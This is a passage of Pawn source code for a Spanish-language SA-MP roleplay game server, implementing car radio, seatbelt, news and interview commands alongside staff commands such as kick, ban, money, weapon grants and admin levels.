	hearingRadioStream[playerid] = true;
	return 1;
}

CMD:emisora(playerid, params[])
{
    new radio, vType, vehicleid = GetPlayerVehicleID(playerid);
	vType = GetVehicleType(vehicleid);

	if(sscanf(params, "i", radio))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /emisora [1-16]. Para apagarla utiliza /emisoraoff.");
	if(!IsPlayerInAnyVehicle(playerid) || (vType != VTYPE_CAR && vType != VTYPE_HEAVY) )
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un auto!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER && GetPlayerVehicleSeat(playerid) != 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en los asientos delanteros!");
	if(radio < 1 || radio > 16)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes ingresar una radio v�lida: del 1 al 16.");

	foreach(new i : Player)
	{
		if(IsPlayerInVehicle(i, vehicleid))
		{
			SendFMessage(i, COLOR_ACT1, "%s sintoniza una radio en el est�reo del auto.", GetPlayerNameEx(playerid));
  			PlayRadioStreamForPlayer(i, radio);
		}
	}
	VehicleInfo[vehicleid][VehRadio] = radio;
	return 1;
}

CMD:emisoraoff(playerid, params[])
{
	new vType, vehicleid = GetPlayerVehicleID(playerid);
	vType = GetVehicleType(vehicleid);

	if(!IsPlayerInAnyVehicle(playerid) || (vType != VTYPE_CAR && vType != VTYPE_HEAVY) )
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un auto!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER && GetPlayerVehicleSeat(playerid) != 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en los asientos delanteros!");
 	foreach(new i : Player)
	{
		if(IsPlayerInVehicle(i, vehicleid))
		{
			SendFMessage(i, COLOR_ACT1, "%s apaga la radio sintonizada en el est�reo del auto.", GetPlayerNameEx(playerid));
		    if(hearingRadioStream[i])
		        StopAudioStreamForPlayer(i);
		}
	}
	VehicleInfo[vehicleid][VehRadio] = 0;
	return 1;
}

//==================================CINTURON====================================

CMD:cint(playerid, params[])
{
	cmd_cinturon(playerid, params);
	return 1;
}

CMD:cinturon(playerid, params[])
{
	new vehicleid = GetPlayerVehicleID(playerid),
		vType = GetVehicleType(vehicleid);
	if(!IsPlayerInAnyVehicle(playerid) || (vType != VTYPE_CAR && vType != VTYPE_HEAVY && vType != VTYPE_MONSTER))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un auto!");
	if(SeatBelt[playerid])
	{
		PlayerActionMessage(playerid, 15.0, "se desabrocha el cintur�n de seguridad.");
	    SeatBelt[playerid] = false;
	}
	else
	{
	    PlayerActionMessage(playerid, 15.0, "se abrocha el cintur�n de seguridad.");
	    SeatBelt[playerid] = true;
	}
	return 1;
}

CMD:vercint(playerid,params[])
{
	cmd_vercinturon(playerid, params);
	return 1;
}

CMD:vercinturon(playerid, params[])
{
	new targetid;
	
	if(sscanf(params, "u", targetid))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /vercinturon [ID/Jugador]");
	if(targetid == INVALID_PLAYER_ID)
 	    return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(!ProxDetectorS(5.0, playerid, targetid))
  	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador no est� cerca tuyo.");
    new vehicleid = GetPlayerVehicleID(targetid),
		vType = GetVehicleType(vehicleid);
	if(!IsPlayerInAnyVehicle(targetid) || (vType != VTYPE_CAR && vType != VTYPE_HEAVY && vType != VTYPE_MONSTER))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El jugador no esta en un vehiculo / el veh�culo no posee cintur�n!");
	/*--------------*/
	if(SeatBelt[targetid])
		SendFMessage(playerid, COLOR_WHITE, "El cintur�n de %s se encuentra abrochado.", GetPlayerNameEx(targetid));
	else
	    SendFMessage(playerid, COLOR_WHITE, "El cintur�n de %s se encuentra desabrochado.", GetPlayerNameEx(targetid));
	return 1;
}



//=============================COMANDOS CTR-MAN=================================

CMD:n(playerid, params[]) {
	cmd_noticia(playerid, params);
	return 1;
}

CMD:noticia(playerid, params[])
{
    new string[128], text[128], closestVeh = GetClosestVehicle(playerid, 7.0);
    
	if(PlayerInfo[playerid][pFaction] != FAC_MAN && InterviewActive[playerid] == false)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No eres reportero / No est�s en una entrevista!");
  	if(sscanf(params, "s[128]", text))
    	return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/n)oticia [texto]");
	if(!IsPlayerInAnyVehicle(playerid) && (closestVeh == INVALID_VEHICLE_ID || VehicleInfo[closestVeh][VehFaction] != FAC_MAN) && GetPlayerBuilding(playerid) != BLD_MAN)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar cerca de una furgoneta, helic�ptero de reportero o en la central de CTR!");
	if(IsPlayerInAnyVehicle(playerid) && VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_MAN)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en alg�n vehiculo de la facci�n para transmitir!");
	if(InterviewActive[playerid] && !ProxDetectorS(5.0, playerid, InterviewOffer[playerid]))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Para poder transmitir debes estar cerca del reportero que te ofreci� la entrevista.");

	format(string, sizeof(string), "[Noticias] por %s: %s", GetPlayerNameEx(playerid), text);
	foreach(new i : Player)
	{
	    if(NewsEnabled[i])
	        SendClientMessage(i, COLOR_LIGHTGREEN, string);
	}
	return 1;
}

forward EndInterviewOffer(playerid);
public EndInterviewOffer(playerid)
{
	if(InterviewActive[playerid] == false) // Si todavia no la acept�
	    InterviewOffer[playerid] = 999;
	return 1;
}

forward EndInterviewActive(playerid);
public EndInterviewActive(playerid)
{
	InterviewActive[playerid] = false;
	InterviewOffer[playerid] = 999;
	return 1;
}

CMD:entrevistar(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] != FAC_MAN)
		return SendClientMessage(playerid, COLOR_GREY, "�Usted no es reportero!");
	new target;
 	if(sscanf(params, "d", target))
    	return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /entrevistar [ID/Jugador]");
	if(!ProxDetectorS(5.0, playerid, target))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto no est� cerca tuyo.");
	new string[128];
	format(string, sizeof(string), "Le has ofrecido una entrevista a %s, espera su respuesta. La oferta dura 15 segundos.", GetPlayerNameEx(target));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), "El reportero %s te quiere entrevistar por la radio, si lo deseas escribe /entrevistarse. Tienes 15 segundos.", GetPlayerNameEx(playerid));
	SendClientMessage(target, COLOR_LIGHTBLUE, string);
	InterviewOffer[target] = playerid;
	SetTimerEx("EndInterviewOffer", 15000, false, "i", target);
	return 1;
}

CMD:entrevistarse(playerid, params[])
{
	if(InterviewOffer[playerid] == 999 || InterviewOffer[playerid] == INVALID_PLAYER_ID || !IsPlayerConnected(InterviewOffer[playerid]))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Ning�n reportero te ha ofrecido una entrevista!");
	if(!ProxDetectorS(5.0, playerid, InterviewOffer[playerid]))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El reportero no est� cerca tuyo.");
	if(InterviewActive[playerid] == true)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Ya te encuentras en una entrevista.");
	new string[128];
	SendClientMessage(playerid, COLOR_WHITE, "Has aceptado la entrevista, ahora podr�s usar /n para hablar al aire en la radio.");
	format(string, sizeof(string), "acepta la entrevista radial ofrecida por %s. La duraci�n es de 5 minutos.", GetPlayerNameEx(InterviewOffer[playerid]));
	PlayerActionMessage(playerid, 15.0, string);
	InterviewActive[playerid] = true;
	SetTimerEx("EndInterviewActive", 300000, false, "i", playerid);
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if(response)
    {
   		RemovePlayerAttachedObject(playerid, index);
   		SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
   		OnPlayerEditToy(playerid, index, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(usingMask[playerid])
	{
	    if(PlayerInfo[forplayerid][pAdmin] < 1) // Si el tipo es admin no se lo ocultamos
	    	ShowPlayerNameTagForPlayer(forplayerid, playerid, false);
	}
	if(!NicksEnabled[forplayerid])
	    ShowPlayerNameTagForPlayer(forplayerid, playerid, false);
	return 1;
}

CMD:cambiarnombre(playerid, params[])
{
	new string[128], name[24], target;

	if(sscanf(params, "us[24]", target, name))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /cambiarnombre [ID/Jugador] [nombre]");
	if(target == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");

	format(PlayerInfo[target][pName], 24, "%s", name);
	format(string, sizeof(string), "[Staff] el administrador %s le ha cambiado el nombre a %s a '%s'.", GetPlayerNameEx(playerid), GetPlayerNameEx(target), name);
	AdministratorMessage(COLOR_ADMINCMD, string, 1);
	SetPlayerName(target, PlayerInfo[target][pName]);

	new houseID = PlayerInfo[target][pHouseKey], bizID = PlayerInfo[target][pBizKey];

    updateCarOwnerName(target);
    
	if(houseID != 0)
	{
	    House[houseID][OwnerName] = name;
	    SaveHouse(houseID);
	}
	if(bizID != 0 && Business[bizID][bOwnerSQLID] == PlayerInfo[target][pID])
	{
		Business[bizID][bOwner] = name;
		saveBusiness(bizID);
	}
	SendFMessage(target, COLOR_WHITE, "Tu nombre ha sido cambiado a %s por el administrador %s.", GetPlayerNameEx(target), GetPlayerNameEx(playerid));
	return 1;
}

CMD:kick(playerid, params[])
{
    new targetid, reason[128];

	if(sscanf(params, "us[128]", targetid, reason))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /kick [ID/Jugador] [raz�n]");
	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(IsPlayerNPC(targetid))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} la ID corresponde a un NPC.");
	    
    KickPlayer(targetid, GetPlayerNameEx(playerid), reason);
    return 1;
}

forward CheckNameAvailable(playerid, accountName[]);
public CheckNameAvailable(playerid, accountName[])
{
    new rows,
		fields,
	    query[128],
	    password[32],
	    string[128];

	cache_get_data(rows, fields);
	
	if(rows)
 		return SendClientMessage(playerid, COLOR_YELLOW2, "Error: Ya existe otra cuenta con ese nombre.");

	valstr(password, 1000000 + random(9000000));
 	mysql_real_escape_string(password, password, 1, sizeof(password));
	format(query, sizeof(query), "INSERT INTO `accounts` (`Name`, `Password`) VALUES ('%s', MD5('%s'))", accountName, password);
	mysql_function_query(dbHandle, query, false, "", "");
	format(string, sizeof(string), "[Staff] el administrador %s ha creado la cuenta '%s'.", GetPlayerNameEx(playerid), accountName);
	AdministratorMessage(COLOR_ADMINCMD, string, 1);
	SendFMessage(playerid, COLOR_WHITE, "La contrase�a de la cuenta que deberas informar al usuario es '%s' (sin las comillas).", password);
	format(string, sizeof(string), "[CREA LA CUENTA] a %s", accountName);
	log(playerid, LOG_ADMIN, string);
	return 1;
}

CMD:crearcuenta(playerid, params[])
{
	new accountName[24],
	    query[128];

	if(sscanf(params, "s[24]", accountName))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /crearcuenta [Nombre_Apellido]");

	mysql_real_escape_string(accountName, accountName, 1, sizeof(accountName));
	format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `Name` = '%s'", accountName);
	mysql_function_query(dbHandle, query, true, "CheckNameAvailable", "is", playerid, accountName);
	return 1;
}

CMD:ban(playerid, params[])
{
	return cmd_banear(playerid, params);
}

CMD:banear(playerid, params[])
{
	new targetid, reason[128];
	
	if(sscanf(params, "us[128]", targetid, reason))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/ban)ear [ID/Jugador] [raz�n]");
   	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
    if(IsPlayerNPC(targetid))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} la ID corresponde a un NPC.");
	    
	BanPlayer(targetid, playerid, reason);
	return 1;
}

CMD:desbanear(playerid, params[])
{
	new query[128], target[32];
	
	if(sscanf(params, "S(0)[32]", target))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /desbanear [IP] � [nombre]");
	    
 	mysql_real_escape_string(target, target,1,sizeof(target));
	if(strfind(target, "_", true) != -1) { // Si tiene un "_" suponemos que es un nombre, caso contrario una IP.
		format(query, sizeof(query),"SELECT * FROM `bans` WHERE `pName` = '%s' AND `banActive` = 1", target);
		mysql_function_query(dbHandle, query, true, "OnUnbanDataLoad", "iis", playerid, 0, target);
	} else {
		format(query, sizeof(query),"SELECT * FROM `bans` WHERE `pIP` = '%s' AND `banActive` = 1", target);
		mysql_function_query(dbHandle, query, true, "OnUnbanDataLoad", "iis", playerid, 1, target);
	}
	return 1;
}

CMD:money(playerid, params[])
{
	new targetid, money, string[128];

	if(sscanf(params, "ui", targetid, money))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /money [ID/Jugador] [dinero]");
 	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

    SetPlayerCash(targetid, money);

	format(string, sizeof(string), "El administrador %s ha seteado tu dinero en efectivo en $%d.", GetPlayerNameEx(playerid), money);
	SendClientMessage(targetid, COLOR_WHITE, string);
	format(string, sizeof(string), "El administrador %s ha seteado el dinero en efectivo de %s en $%d.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid), money);
    AdministratorMessage(COLOR_ADMINCMD, string, 1);
	format(string, sizeof(string), "[MONEY] $%d a %s (DBID: %d)", money, GetPlayerNameEx(targetid), PlayerInfo[targetid][pID]);
	log(playerid, LOG_ADMIN, string);
    return 1;
}

CMD:givemoney(playerid, params[])
{
	new targetid, money, string[128];

	if(sscanf(params, "ui", targetid, money))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /givemoney [ID/Jugador] [dinero]");
 	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

	GivePlayerCash(targetid, money);
	
	format(string, sizeof(string), "El administrador %s te ha seteado $%d en efectivo adicional a lo que ya ten�as.", GetPlayerNameEx(playerid), money);
	SendClientMessage(targetid, COLOR_WHITE, string);
	format(string, sizeof(string), "El administrador %s le ha seteado $%d en efectivo adicional a lo que ya ten�a %s.", GetPlayerNameEx(playerid), money, GetPlayerNameEx(targetid));
    AdministratorMessage(COLOR_ADMINCMD, string, 1);
	format(string, sizeof(string), "[GIVEMONEY] $%d a %s (DBID: %d)", money, GetPlayerNameEx(targetid), PlayerInfo[targetid][pID]);
	log(playerid, LOG_ADMIN, string);
    return 1;
}

CMD:sethp(playerid, params[])
{
   	new targetid, health;

	if(sscanf(params, "ui", targetid, health))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /sethp [ID/Jugador] [health]");
 	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

    SetPlayerHealthEx(targetid, health);
    /*TakeHeadShot[targetid] = 0;*/
    if(GetPVarInt(targetid, "disabled") == DISABLE_DEATHBED)
        SetPVarInt(targetid, "disabled", DISABLE_NONE);
	return 1;
}

CMD:setarmour(playerid, params[])
{
   	new targetid, armour;

	if(sscanf(params, "ui", targetid, armour))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /setarmour [ID/Jugador] [armour]");
 	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

	SetPlayerArmour(targetid, armour);
	return 1;
}

CMD:givegun(playerid, params[])
{
	new targetid, weapon, ammo, string[128];

	if(sscanf(params, "uii", targetid, weapon, ammo))
	{
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /givegun [ID/Jugador] [arma] [municiones]");
        SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "3(Club) 4(knife) 5(bat) 6(Shovel) 7(Cue) 8(Katana) 10-13(Dildo) 14(Flowers) 16(Grenades) 18(Molotovs) 22(Pistol) 23(SPistol)");
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "24(Eagle) 25(shotgun) 29(MP5) 30(AK47) 31(M4) 33(Rifle) 34(Sniper) 37(Flamethrower) 41(spray) 42(exting) 43(Camera) 46(Parachute)");
	}
	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(ammo < 1 || ammo > 999)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} La munici�n debe ser 1-999.");
	if(weapon < 1 || weapon > 46)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} El ID de arma debe ser 1-46.");
    if(GivePlayerGun(targetid, weapon, ammo))
    {
		format(string, sizeof(string), "El administrador %s te ha seteado el arma %s con %d de munici�n.", GetPlayerNameEx(playerid), GetItemName(weapon), ammo);
		SendClientMessage(targetid, COLOR_WHITE, string);
		format(string, sizeof(string), "El administrador %s le ha seteado el arma %s con %d de munici�n a %s.", GetPlayerNameEx(playerid), GetItemName(weapon), ammo, GetPlayerNameEx(targetid));
        AdministratorMessage(COLOR_ADMINCMD, string, 1);
   		format(string, sizeof(string), "[GUN] %d - %d a %s (DBID: %d)", weapon, ammo, GetPlayerNameEx(targetid), PlayerInfo[targetid][pID]);
		log(playerid, LOG_ADMIN, string);
	}
	else
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} El usuario no tiene ninguna mano libre para agarrar el arma.");
	return 1;
}

CMD:skin(playerid, params[])
{
	new targetid, skin;

    if(sscanf(params, "ui", targetid, skin))
    	return SendClientMessage(playerid, COLOR_GRAD2, "{5CCAF1}[Sintaxis]:{C8C8C8} /skin [ID/Jugador] [ID skin]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(skin < 1 || skin > 299)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de skin incorrecto.");

    SetPlayerSkin(targetid, skin);
    PlayerInfo[targetid][pSkin] = skin;
    return 1;
}

CMD:setadmin(playerid, params[])
{
	new targetid, adminlevel, string[128];

    if(sscanf(params, "ui", targetid, adminlevel))
    	return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /setadmin [ID/Jugador] [adminlevel]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(adminlevel < 0 || adminlevel > 20)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} nivel de admin debe ser, 0-20.");

    PlayerInfo[targetid][pAdmin] = adminlevel;
	format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} %s te ha hecho administrador nivel %d.", GetPlayerNameEx(playerid),adminlevel);
	SendClientMessage(targetid, COLOR_WHITE, string);
	format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} has hecho a %s un administrador nivel %d.", GetPlayerNameEx(targetid),adminlevel);
	SendClientMessage(playerid, COLOR_WHITE, string);
    return 1;
}

CMD:advertir(playerid, params[])
{
    new targetid, reason[128], string[128];

    if(sscanf(params, "us[128]", targetid, reason))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /advertir [ID/Jugador] [raz�n]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

	PlayerInfo[targetid][pWarnings] += 1;
	format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} has advertido a %s, raz�n: %s.", GetPlayerNameEx(targetid), reason);
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, string);
	format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} has sido advertido por %s, raz�n: %s.", GetPlayerNameEx(playerid), reason);
	SendClientMessage(targetid, COLOR_LIGHTYELLOW2, string);
	SendFMessage(targetid, COLOR_LIGHTYELLOW2, "A las 5 advertencias ser�s baneado del servidor, ahora tienes %d.", PlayerInfo[targetid][pWarnings]);
	if(PlayerInfo[targetid][pWarnings] >= 5)
	{
		format(string, sizeof(string), "[BAN]: %s ha sido baneado por tener 5+ advertencias.", GetPlayerNameEx(targetid));
		BanPlayer(targetid, playerid, reason);
	}
	return 1;
}

CMD:mute(playerid, params[])
{
	new targetid, string[128];

    if(sscanf(params, "u", targetid))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mute [ID/Jugador]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

	if(Muted[targetid] == 0)
	{
		Muted[targetid] = 1;
		format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} Has muteado a %s.", GetPlayerNameEx(targetid));
		SendClientMessage(playerid, COLOR_ADMINCMD, string);
		format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} Has sido muteado por %s.", GetPlayerNameEx(playerid));
		SendClientMessage(targetid, COLOR_ADMINCMD, string);
	} else
		{
			Muted[targetid] = 0;
			format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} Has desmuteado a %s.", GetPlayerNameEx(targetid));
			SendClientMessage(playerid, COLOR_ADMINCMD, string);
			format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} Has sido desmuteado por %s.", GetPlayerNameEx(playerid));
			SendClientMessage(targetid, COLOR_ADMINCMD, string);
		}
	return 1;
}

CMD:check(playerid, params[])
{
	new targetid;

	if(sscanf(params, "u", targetid))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /check [ID/Jugador]");
	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} Jugador inv�lido");

    ShowStats(playerid, targetid, true);
    return 1;
}

CMD:gooc(playerid, params[])
{
	new text[128], string[128];

 	if(sscanf(params, "s[128]", text))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} [/go]oc [mensaje]");
    if(OOCStatus == 0 && PlayerInfo[playerid][pAdmin] < 1)
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} OOC global desactivado.");
	if(Muted[playerid])
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} Usted se encuentra muteado.");

	if(PlayerInfo[playerid][pAdmin] >= 1 && AdminDuty[playerid])
	{
		format(string, sizeof(string), "(( [Global] {3CB371}%s{87CEFA}: %s ))", GetPlayerNameEx(playerid), text);
		SendClientMessageToAll(COLOR_GLOBALOOC, string);
		log(playerid, LOG_CHAT, string);
	} else
		{
			format(string, sizeof(string), "(( [Global] %s: %s ))", GetPlayerNameEx(playerid), text);
			SendClientMessageToAll(COLOR_GLOBALOOC, string);
			log(playerid, LOG_CHAT, string);
		}
	return 1;
}

CMD:susurrar(playerid, params[])
{
	new targetid, text[128], string[128];

	if(sscanf(params, "us[128]", targetid, text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /susurrar [ID/Jugador] [mensaje]");
	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
    if(!ProxDetectorS(1.5, playerid, targetid))
        return SendClientMessage(playerid, COLOR_YELLOW2, "Est�s demasiado lejos.");
	if(playerid == targetid)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes susurrarte a t� mismo.");

 	if(!usingMask[playerid])
		format(string, sizeof(string), "%s susurra: %s", GetPlayerNameEx(playerid), text);
	else
	    format(string, sizeof(string), "Enmascarado %d susurra: %s", maskNumber[playerid], text);
	SendClientMessage(targetid, COLOR_YELLOW, string);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	PlayerPlayerActionMessage(playerid, targetid, 5.0, "ha susurrado algo al o�do de");
	return 1;
}

CMD:me(playerid, params[])
{
	new text[128], string[128];

	if(sscanf(params, "s[128]", text))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /me [acci�n]");

	format(string, sizeof(string), "%s", text);
	PlayerActionMessage(playerid, 15.0, text);
	return 1;
}

CMD:cme(playerid, params[])
{
    new str[100], text[100];

    if(sscanf(params, "s[100]", text))
		return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /cme [texto]. Recuerda que el /cme se usa para indicar acciones.");

    format(str, sizeof(str), "%s", text);
	PlayerCmeMessage(playerid, 15.0, 5000, str);
    return 1;
}

CMD:local(playerid, params[])
{
	new text[128], string[128];

	if(sscanf(params, "s[128]", text))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /local [mensaje]");

	if(!usingMask[playerid])
		format(string, sizeof(string), "%s dice: %s", GetPlayerNameEx(playerid), text);
	else
	    format(string, sizeof(string), "Enmascarado %d dice: %s", maskNumber[playerid], text);
	ProxDetector(15.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	return 1;
}

CMD:vb(playerid, params[])
{
	new text[128], string[128];

	if(sscanf(params, "s[128]", text))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /vb [mensaje]");

	if(!usingMask[playerid])
		format(string, sizeof(string), "[Voz baja] %s dice: %s", GetPlayerNameEx(playerid), text);
	else
		format(string, sizeof(string), "[Voz baja] Enmascarado %d dice: %s", maskNumber[playerid], text);
	ProxDetector(3.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	return 1;
}

CMD:b(playerid, params[])
{
	new text[128], string[128];

	if(sscanf(params, "s[128]", text))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /b [mensaje]");
    if(PlayerInfo[playerid][pMuteB] > 0)
	{
	    if(PlayerInfo[playerid][pMuteB] > 60)
			SendFMessage(playerid, COLOR_YELLOW2, "No puedes hablar por /b por %d minutos.", PlayerInfo[playerid][pMuteB] / 60);
		else
		    SendFMessage(playerid, COLOR_YELLOW2, "No puedes hablar por /b por %d segundos.", PlayerInfo[playerid][pMuteB]);
		return 1;
	}
	format(string, sizeof(string), "%s", text);
	PlayerLocalMessage(playerid, 15.0, string);
	if(PlayerInfo[playerid][pAdmin] == 0)
	    PlayerInfo[playerid][pMuteB] = 5;
	    
	return 1;
}
	
CMD:mp(playerid, params[])
{
	new targetid, text[128];

	if(sscanf(params, "us[128]", targetid, text))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mp [ID/Jugador] [mensaje]");
	if(!PMsEnabled[playerid] && !AdminDuty[playerid])
